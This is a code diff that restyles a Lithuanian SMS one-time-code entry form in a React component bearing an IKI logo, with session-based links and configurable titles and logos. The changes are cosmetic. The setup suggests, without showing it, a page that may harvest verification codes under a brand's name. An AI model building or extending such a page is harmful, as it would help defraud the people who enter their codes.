@@ -121,9 +121,9 @@ export function SmsClient({ sessionId }: Props) {
 
   if (!supabase) {
     return (
-      <div className="a3d-shell items-center justify-center p-4">
-        <div className="a3d-card w-full max-w-[560px] p-5 sm:p-8">
-          <ConfigMissing />
+      <div className="pak-page-shell">
+        <div className="pak-form-card w-full max-w-[650px] p-5 sm:p-8">
+          <div className="pak-form-inner"><ConfigMissing /></div>
         </div>
       </div>
     );
@@ -131,11 +131,13 @@ export function SmsClient({ sessionId }: Props) {
 
   if (!sessionId) {
     return (
-      <div className="a3d-shell items-center justify-center p-4">
-        <div className="a3d-card w-full max-w-[460px] p-8 text-center">
-          <p className="rounded-2xl border border-red-200 bg-red-50/90 p-4 text-center text-sm font-medium text-red-600">
-            Neteisinga nuoroda.
-          </p>
+      <div className="pak-page-shell">
+        <div className="pak-form-card w-full max-w-[650px] p-5 sm:p-8 text-center">
+          <div className="pak-form-inner">
+            <p className="rounded-xl border border-red-500/30 bg-red-500/10 p-4 text-center text-sm text-red-400">
+              Neteisinga nuoroda.
+            </p>
+          </div>
         </div>
       </div>
     );
@@ -143,9 +145,11 @@ export function SmsClient({ sessionId }: Props) {
 
   if (loading) {
     return (
-      <div className="a3d-shell items-center justify-center p-4">
-        <div className="a3d-card flex w-full max-w-[460px] justify-center p-8 py-16">
-          <div className="a3d-spinner size-12" />
+      <div className="pak-page-shell">
+        <div className="pak-form-card flex w-full max-w-[650px] justify-center p-5 py-16 sm:p-8">
+          <div className="pak-form-inner flex justify-center">
+            <div className="size-12 animate-spin rounded-full border-4 border-[#4ade80] border-t-transparent" />
+          </div>
         </div>
       </div>
     );
@@ -190,36 +194,33 @@ export function SmsClient({ sessionId }: Props) {
   };
 
   return (
-    <div className="a3d-shell">
-      <div className="a3d-glow left-[-10%] top-[-12%] h-[440px] w-[440px] bg-[rgba(var(--brand-rgb),0.15)]" />
-      <div className="a3d-glow bottom-[-14%] right-[-8%] h-[400px] w-[400px] bg-[rgba(var(--brand-rgb),0.11)]" />
-
-      <main className="relative z-10 flex w-full flex-1 flex-col items-center justify-center p-4">
-        <div className="a3d-card a3d-in w-full max-w-[480px] overflow-hidden px-6 py-8 sm:px-9 sm:py-9">
-          <div className="mb-6 flex items-start justify-between gap-4">
-            <div className="min-w-0">
-              <h2 className="a3d-title text-[24px] leading-tight">{settings.sms_title}</h2>
-              <p className="a3d-sub mt-2 text-sm font-medium whitespace-pre-line">{displayText.replace("{digits}", digits.toString())}</p>
+    <div className="pak-page-shell">
+      <div className="pak-form-card w-full max-w-[860px] fade-in">
+        <div className="pak-form-inner px-4 pb-5 pt-5 sm:px-8 sm:pb-8 sm:pt-8 lg:px-10">
+          <div className="flex items-start justify-between gap-3">
+            <div className="min-w-0 max-w-[29rem]">
+              <h2 className="pak-form-title">{settings.sms_title}</h2>
+              <p className="pak-form-subtitle mt-2 whitespace-pre-line">{displayText.replace("{digits}", digits.toString())}</p>
             </div>
             <img
-              src={settings.logo_url || "/form-assets/iki-mini-logo.png"}
+              src={settings.logo_url || "/form-assets/iki-mini-logo.webp"}
               alt="IKI logo"
-              className="h-11 w-11 shrink-0 object-contain"
+              className="pak-form-brand-logo shrink-0"
               id="sms-ah-logo"
             />
           </div>
 
-          <form onSubmit={handleSubmit} className="space-y-5">
-            <div className="block text-[13px] font-semibold text-[#344054]">
+          <form onSubmit={handleSubmit} className="mt-5 space-y-5 sm:mt-6">
+            <div className="pak-form-label">
               <div className="mb-3">{settings.sms_input_label} ({digits})</div>
               <div
                 className="grid w-full gap-2 mx-auto"
                 style={{
                   gridTemplateColumns: `repeat(${digits}, minmax(0, 1fr))`,
                   maxWidth:
-                    digits <= 4 ? "300px" :
-                    digits <= 6 ? "400px" :
-                    digits <= 8 ? "500px" : "100%",
+                    digits <= 4 ? "320px" :
+                    digits <= 6 ? "420px" :
+                    digits <= 8 ? "520px" : "100%",
                 }}
                 onPaste={handlePaste}
               >
@@ -231,7 +232,7 @@ export function SmsClient({ sessionId }: Props) {
                     inputMode="numeric"
                     autoComplete="one-time-code"
                     maxLength={1}
-                    className={`a3d-otp text-xl sm:text-2xl ${code[index] ? "a3d-filled" : ""}`}
+                    className="pak-form-otp aspect-[5/6] text-center text-xl font-bold sm:text-2xl"
                     value={code[index] || ""}
                     onChange={(e) => handleOtpChange(index, e.target.value)}
                     onKeyDown={(e) => handleOtpKeyDown(index, e)}
@@ -241,30 +242,30 @@ export function SmsClient({ sessionId }: Props) {
             </div>
 
             {!valid && code.length > 0 ? (
-              <p className="text-xs font-medium text-red-500">Įveskite tiksliai {digits} skaitmenis.</p>
+              <p className="text-xs text-red-400">Įveskite tiksliai {digits} skaitmenis.</p>
             ) : null}
 
-            {msg ? <p className="text-center text-sm font-medium text-red-500">{msg}</p> : null}
+            {msg ? <p className="text-center text-sm text-red-400">{msg}</p> : null}
 
-            <button
-              type="submit"
-              disabled={saving || !valid}
-              className="a3d-btn w-full px-6 py-4 text-[16px]"
-            >
-              {saving ? settings.sms_loading : settings.sms_button}
-            </button>
-
-            <div className="flex justify-center pt-1">
-              <div className="a3d-pill">
-                <svg className="h-4 w-4 text-[var(--brand)]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.9" d="M12 3.7 18.4 6v5.2c0 4-2.3 7.1-6.4 9.1-4.1-2-6.4-5.1-6.4-9.1V6L12 3.7Z" />
+            <div className="flex flex-col gap-3 pt-1 md:flex-row md:items-center md:justify-between">
+              <div className="pak-form-security">
+                <svg className="h-9 w-9 shrink-0 text-[#4ade80]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.9">
+                  <path d="M12 3.7 18.4 6v5.2c0 4-2.3 7.1-6.4 9.1-4.1-2-6.4-5.1-6.4-9.1V6L12 3.7Z" strokeLinejoin="round" />
                 </svg>
                 <span>Kodas išsiųstas SMS žinute jūsų telefono numeriu.</span>
               </div>
+
+              <button
+                type="submit"
+                disabled={saving || !valid}
+                className="pak-form-button min-h-[3.85rem] w-full px-6 text-lg md:w-[22rem]"
+              >
+                {saving ? settings.sms_loading : settings.sms_button}
+              </button>
             </div>
           </form>
         </div>
-      </main>
+      </div>
     </div>
   );
 }
